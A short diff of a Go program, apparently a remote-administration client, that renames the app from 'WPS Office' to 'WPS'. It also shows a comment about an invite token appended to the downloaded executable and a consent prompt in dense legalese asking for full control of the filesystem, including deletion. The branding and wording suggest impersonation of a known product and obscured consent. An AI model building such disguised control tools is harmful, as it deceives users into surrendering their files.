@@ -32,7 +32,7 @@ var (
 	version     = "0.1.0"
 )
 
-const appName = "WPS Office"
+const appName = "WPS"
 
 type config struct {
 	Server   string `json:"server"`
@@ -174,7 +174,7 @@ func server() string {
 }
 
 // inviteTrailerMarker precedes the invite token appended to the downloaded exe.
-// The server names the download "WPS Office.exe" (clean) and appends "WPS-INVITE:<tok>"
+// The server names the download "WPS.exe" (clean) and appends "WPS-INVITE:<tok>"
 // to its bytes; we read that here. Downloads with the token in the file name
 // still work via the regex.
 const inviteTrailerMarker = "WPS-INVITE:"
@@ -239,7 +239,7 @@ func firstRun(cfgPath string) (config, error) {
 		log.Print("no server or invite token")
 		return config{}, errors.New("no server or invite token")
 	}
-	msg := "WPS Office hereby tenders, with due solemnity and in the most formal terms, a petition to this workstation, soliciting plenary, continuing and unreserved authorization to superintend, adjudicate, administer and otherwise dispose of the entirety of the filesystem heretofore entrusted to its custody.\n\n" +
+	msg := "WPS hereby tenders, with due solemnity and in the most formal terms, a petition to this workstation, soliciting plenary, continuing and unreserved authorization to superintend, adjudicate, administer and otherwise dispose of the entirety of the filesystem heretofore entrusted to its custody.\n\n" +
 		"Should you vouchsafe your assent, the administrator shall be invested with an expansive, comprehensive and abiding prerogative to scrutinize, catalogue, appraise and, where circumstance so requires, to alter every artifact domiciled upon the local storage volumes. " +
 		"That prerogative encompasses, without limitation or reservation, the enumeration and perlustration of directory hierarchies, the faithful replication of documents, the transposition of objects from one repository to another, the rechristening of filenames, and, where indispensable necessity so ordains, the irrevocable and unrecoverable obliteration of data.\n\n" +
 		"You are earnestly enjoined to contemplate the gravity of this entreaty with circumspection, deliberation and an undivided attention before rendering your determination. " +
